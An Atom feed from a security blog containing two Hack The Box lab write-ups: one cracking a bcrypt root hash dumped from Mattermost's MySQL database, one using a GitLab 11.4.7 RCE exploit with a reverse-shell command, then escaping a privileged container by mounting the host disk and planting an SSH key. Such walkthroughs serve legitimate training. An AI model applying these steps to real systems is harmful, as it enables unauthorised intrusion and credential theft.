<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-27T02:47:12-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">H4ck 4n3t</title><subtitle>Posts about security, CTFs and networking</subtitle><author><name>Dkb4rb</name><email>info@dkb4rb.io</email></author><entry><title type="html">Delivery - Hack The Box</title><link href="http://localhost:4000/htb-writeup-delivery/" rel="alternate" type="text/html" title="Delivery - Hack The Box" /><published>2021-05-22T00:00:00-05:00</published><updated>2021-05-22T00:00:00-05:00</updated><id>http://localhost:4000/htb-writeup-delivery</id><content type="html" xml:base="http://localhost:4000/htb-writeup-delivery/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/delivery_logo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we’ll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we’ll use hashcat combined with rules to crack the password then get the root shell.&lt;/p&gt;

&lt;h2 id=&quot;portscan&quot;&gt;Portscan&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report for 10.129.148.141
Host is up (0.018s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Sun, 09 May 2021 00:00:02 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: fqrpd5m3ftgnzmxkbieezqadxo
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Sun, 09 May 2021 00:01:31 GMT
|     &amp;lt;!doctype html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&quot;&amp;gt;&amp;lt;meta name=&quot;robots&quot; content=&quot;noindex, nofollow&quot;&amp;gt;&amp;lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&amp;gt;&amp;lt;title&amp;gt;Mattermost&amp;lt;/title&amp;gt;&amp;lt;meta name=&quot;mobile-web-app-capable&quot; content=&quot;yes&quot;&amp;gt;&amp;lt;meta name=&quot;application-name&quot; content=&quot;Mattermost&quot;&amp;gt;&amp;lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot;&amp;gt;&amp;lt;link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Sun, 09 May 2021 00:01:31 GMT
|_    Content-Length: 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;website&quot;&gt;Website&lt;/h2&gt;

&lt;p&gt;The Delivery website is pretty basic, there’s a link to a vhost called helpdesk.delivery.htb and a contact us section. We’ll add this entry to our local host before proceeding further.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/website1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The contact us section tells us we need an @delivery.htb email address and tells us port 8065 is a MatterMost server. MatterMost is a Slack-like collaboration platform that can be self-hosted.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/website2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Browsing to port 8065 we get the MatterMost login page but we don’t have credentials yet&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;helpdesk&quot;&gt;Helpdesk&lt;/h2&gt;

&lt;p&gt;The Helpdesk page uses the OsTicket web application. It allows users to create and view the status of ticket.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/helpdesk3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can still open new tickets even if we only have a guest user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/helpdesk1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a ticket has been created, the system generates a random @delivery.htb email account with the ticket ID.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/helpdesk2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we have an email account we can create a MatterMost account.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A confirmation email is then sent to our ticket status inbox.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We use the check ticket function on the OsTicket application and submit the original email address we used when creating the ticket and the ticket ID.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We’re now logged in and we see that the MatterMost confirmation email has been added to the ticket information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To confirm the creation of our account we’ll just copy/paste the included link into a browser new tab.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After logging in to MatterMost we have access to the Internal channel where we see that credentials have been posted. There’s also a hint that we’ll have to use a variation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PleaseSubscribe!&lt;/code&gt; password later.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/mm7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;user-shell&quot;&gt;User shell&lt;/h2&gt;

&lt;p&gt;With the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maildeliverer / Youve_G0t_Mail!&lt;/code&gt; credentials we can SSH in and get the user flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/user.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;credentials-in-mysql-database&quot;&gt;Credentials in MySQL database&lt;/h2&gt;

&lt;p&gt;After doing some recon we find the MatterMost installation directory in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/mattermost&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maildeliverer@Delivery:/opt/mattermost/config$ ps waux | grep -i mattermost
matterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost/bin/mattermost
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.json&lt;/code&gt; file contains the password for the MySQL database:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
&quot;SqlSettings&quot;: {
        &quot;DriverName&quot;: &quot;mysql&quot;,
        &quot;DataSource&quot;: &quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&quot;,
[...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We’ll connect to the database server and poke around.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maildeliverer@Delivery:/$ mysql -u mmuser --password='Crack_The_MM_Admin_PW'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 91
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&amp;gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;MatterMost user accounts are stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Users&lt;/code&gt; table and hashed with bcrypt. We’ll save the hashes then try to crack them offline.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MariaDB [(none)]&amp;gt; use mattermost;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mattermost]&amp;gt; select Username,Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| snowscan                         | $2a$10$spHk8ZGr54VWf4kNER/IReO.I63YH9d7WaYp9wjiRswDMR.P/Q9aa |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------------+--------------------------------------------------------------+
8 rows in set (0.002 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cracking-with-rules&quot;&gt;Cracking with rules&lt;/h2&gt;

&lt;p&gt;There was a hint earlier that some variation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PleaseSubscribe!&lt;/code&gt; is used.&lt;/p&gt;

&lt;p&gt;I’ll use hashcat for this and since I don’t know the hash ID for bcrypt by heart I can find it in the help.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\bin\hashcat&amp;gt;hashcat --help | findstr bcrypt
   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;My go-to rules is normally one of those two ruleset:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule&quot;&gt;https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule&quot;&gt;https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These will perform all sort of transformations on the wordlist and we can quickly crack the password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PleaseSubscribe!21&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\bin\hashcat&amp;gt;hashcat -a 0 -m 3200 -w 3 -O -r rules\_NSAKEY.v2.dive.rule hash.txt wordlist.txt
[...]
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
[...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The root password from MatterMost is the same as the local root password so we can just su to root and get the system flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Dkb4rb</name><email>info@dkb4rb.io</email></author><category term="hackthebox" /><category term="infosec" /><category term="osticket" /><category term="mysql" /><category term="mattermost" /><category term="hashcat" /><category term="rules" /><summary type="html">Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we'll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we'll use hashcat combined with rules to crack the password then get the root shell.</summary></entry><entry><title type="html">Ready - Hack The Box</title><link href="http://localhost:4000/htb-writeup-ready/" rel="alternate" type="text/html" title="Ready - Hack The Box" /><published>2021-05-15T00:00:00-05:00</published><updated>2021-05-15T00:00:00-05:00</updated><id>http://localhost:4000/htb-writeup-ready</id><content type="html" xml:base="http://localhost:4000/htb-writeup-ready/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/ready_logo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ready was a pretty straighforward box to get an initial shell on: We identify that’s it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we’re in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory.&lt;/p&gt;

&lt;h2 id=&quot;portscan&quot;&gt;Portscan&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -T4 -sC -sV -oA scan -p- 10.129.149.31
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 22:41 EDT
Nmap scan report for 10.129.149.31
Host is up (0.015s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.129.149.31:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;gitlab&quot;&gt;Gitlab&lt;/h2&gt;

&lt;p&gt;The webserver on port 5080 runs a Gitlab instance.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/gitlab1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have access to create a new account.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/gitlab2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once logged in, we see in the projects list there’s a single projet called &lt;em&gt;ready-channel&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/gitlab3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To check the Gitlab version we go to the Help section and we can see it’s running 11.4.7.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/gitlab5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A quick search on Exploit-DB shows there’s an authenticated remote code execution vulnerability for this exact version.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/gitlab6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 exploit.py -g http://10.129.149.31 -u snowscan2 -p yolo1234 -l 10.10.14.4 -P 4444&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Reverse shell connection:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/user.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privesc&quot;&gt;Privesc&lt;/h2&gt;

&lt;p&gt;By running &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&quot;&gt;linpeas.sh&lt;/a&gt; we find a backup file with some SMTP credentials for the gitlab application.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Found /opt/backup/gitlab.rb
gitlab_rails['smtp_password'] = &quot;wW59U!ZKMbG9+*#h&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That password is the same password as the root password for the container so we can privesc locally inside the container.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@gitlab:/opt/backup$ su -l root
su -l root
Password: wW59U!ZKMbG9+*#h

root@gitlab:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There’s a root_pass file in the root of the filesystem but that’s not useful.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /root_pass
YG65407Bjqvv9A0a8Tm_7w
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/backup/docker-compose.yml&lt;/code&gt; configuration file, we can see it’s a hint that we’re running in a privileged container:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Privileged containers can access the host’s disk devices so we can just read the root flag after mounting the drive.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To get a proper shell in the host OS we can drop our SSH keys in the root’s .ssh directory.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gitlab:~# mount /dev/sda2 /mnt
mount /dev/sda2 /mnt
root@gitlab:~# echo 'ssh-rsa AAAAB3NzaC1y[...]+HUBS+l32faXPc= snowscan@kali' &amp;gt; /mnt/root/.ssh/authorized_keys

[...]

$ ssh root@10.129.150.37
The authenticity of host '10.129.150.37 (10.129.150.37)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.150.37' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

[...]

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 11 14:28:18 2021
root@ready:~# cat root.txt
b7f98681505cd39066f67147b103c2b3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Dkb4rb</name><email>info@dkb4rb.io</email></author><category term="hackthebox" /><category term="infosec" /><category term="linux" /><category term="gitlab" /><category term="cve" /><category term="docker" /><category term="privileged container" /><summary type="html">Ready was a pretty straighforward box to get an initial shell on: We identify that's it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we're in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory.</summary></entry></feed>